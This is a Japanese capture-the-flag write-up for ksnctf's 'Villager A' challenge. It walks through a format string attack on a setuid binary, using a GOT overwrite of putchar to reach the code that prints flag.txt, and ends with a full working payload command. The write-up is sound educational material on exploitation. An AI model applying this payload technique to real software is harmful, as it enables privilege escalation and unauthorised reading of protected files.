## [4. Villager A](http://ksnctf.sweetduet.info/problem/4)

指定されたサーバにSSHで入る。
ホームディレクトリにあるファイルは次の通り。

```console
[q4@localhost ~]$ ls -l
total 16
-r--------. 3 q4a  q4a    22 May 22  2012 flag.txt
-rwsr-xr-x. 1 q4a  q4a  5857 May 22  2012 q4
-rw-r--r--. 1 root root  151 Jun  1  2012 readme.txt
```

おそらく `flag.txt` にflagが書いてあると思われるが、アクセス権がない。
`q4` を実行してその中身を読むのだろう。

とりあえず `q4` を実行すると、名前を聞かれ、その後 "no" を入力するまで無限ループする。

```console
[q4@localhost ~]$ ./q4
What's your name?
ordovicia
Hi, ordovicia

Do you want the flag?
yes
Do you want the flag?
yes
Do you want the flag?
no
I see. Good bye.
```

おそらく [format string attack](https://ja.wikipedia.org/wiki/%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E5%88%97%E6%94%BB%E6%92%83) を使うのだろう。
そこで攻撃してみると、

```console
[q4@localhost ~]$ echo -e "AAAA, %x, %x, %x, %x, %x, %x, %x" | ./q4
What's your name?
Hi, AAAA, 400, 3a78c0, 8, 14, 806fc4, 41414141, 7825202c

Do you want the flag?
```

となり、スタックの6番目の領域に、入力した値 (`AAAA` = `0x41, 0x41, 0x41, 0x41`) が格納されていることが分かる。

何を入力すれば攻撃が成功するのか考えるため、逆アセンブルして解析を進める。
[逆アセンブルの結果](https://github.com/ordovicia/ksnctf/blob/master/4_Villager_A/dis.asm) から抜粋すると、次のように動作していそうだと想像できる。

```
...
08048474 <putchar@plt>:
 8048474:	ff 25 e0 99 04 08    	jmp    DWORD PTR ds:0x80499e0
 804847a:	68 08 00 00 00       	push   0x8
 804847f:	e9 d0 ff ff ff       	jmp    8048454 <.plt>
...

080485b4 <main>:
 ...

 // 1. 最初の出力. "What's your name?"
 80485c7:	e8 f8 fe ff ff       	call   80484c4 <puts@plt>
 ...

 // 2. 最初の入力
 80485e4:	e8 9b fe ff ff       	call   8048484 <fgets@plt>

 // 3. "Hi, " を出力
 80485e9:	c7 04 24 b6 87 04 08 	mov    DWORD PTR [esp],0x80487b6
 80485f0:	e8 bf fe ff ff       	call   80484b4 <printf@plt>

 // 4. 2で入力した値を出力
 80485f5:	8d 44 24 18          	lea    eax,[esp+0x18]
 80485f9:	89 04 24             	mov    DWORD PTR [esp],eax
 80485fc:	e8 b3 fe ff ff       	call   80484b4 <printf@plt>

 // 5. '\n' を出力
 8048601:	c7 04 24 0a 00 00 00 	mov    DWORD PTR [esp],0xa
 8048608:	e8 67 fe ff ff       	call   8048474 <putchar@plt>

 // 6. "no" を入力するまで無限ループ
 804860d:	c7 84 24 18 04 00 00 	mov    DWORD PTR [esp+0x418],0x1
 ...
 804868f:	75 89                	jne    804861a <main+0x66>

 // 7. "flag.txt" ファイルを読んで出力
 8048691:	c7 44 24 04 e6 87 04 	mov    DWORD PTR [esp+0x4],0x80487e6
 8048698:	08
 8048699:	c7 04 24 e8 87 04 08 	mov    DWORD PTR [esp],0x80487e8
 80486a0:	e8 ff fd ff ff       	call   80484a4 <fopen@plt>
 80486a5:	89 84 24 1c 04 00 00 	mov    DWORD PTR [esp+0x41c],eax
 80486ac:	8b 84 24 1c 04 00 00 	mov    eax,DWORD PTR [esp+0x41c]
 80486b3:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80486b7:	c7 44 24 04 00 04 00 	mov    DWORD PTR [esp+0x4],0x400
 80486be:	00
 80486bf:	8d 44 24 18          	lea    eax,[esp+0x18]
 80486c3:	89 04 24             	mov    DWORD PTR [esp],eax
 80486c6:	e8 b9 fd ff ff       	call   8048484 <fgets@plt>
 80486cb:	8d 44 24 18          	lea    eax,[esp+0x18]
 80486cf:	89 04 24             	mov    DWORD PTR [esp],eax
 80486d2:	e8 dd fd ff ff       	call   80484b4 <printf@plt>
 ...
```

7に飛べればflagが得られるが、このままではたどり着けない。
そこでGOT overwriteにより7に飛ぶことを考える。
つまり、

* 2で format string attack をおこなうことにより、
* `putchar()` のGOTが参照している `0x80499e0` の参照先を `0x8048691` に書き換え、
* 5の `putchar()` 呼び出しで7に飛ぶ。

Format string attack でのメモリ書き込みは `%n` 系のフォーマット指定子を使う。
これは引数をアドレスとして解釈し、「printfが出力しているバイト数」をそのアドレスに書き込む。
`%n` は4バイト、`%hn` は2バイト、`%hhn` は1バイト書き込む。
書き込みたい値が大きいとき、`%n` を使うと「出力しているバイト数」を満たすために大量に書き込みが必要になることがあるので、
`%hn`, `%hhn` を使い2バイト、1バイトごとに分けて書き込むことがある。
今回は、エンディアンも考慮して、

* `0x80499e0` に下位2バイト `0x86`, `0x91`
* `0x80499e2` に上位2バイト `0x08`, `0x04`

を書き込む。
「出力しているバイト数」を合わせるため、それぞれの書き込みの前に `0x8691 - 8 = 34441`, `0x0804 - 34441 - 8 = 33139` バイト出力する。
また、`q4` に入力した値はスタックの6番目に格納されることが分かっている。
つまり、

```
\xe0\x99\x04\x08
\xe2\x99\x04\x08
%34441x
%6$hn
%33139x
%7$hn
```

をつなげて入力すればよい。

```console
$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
```
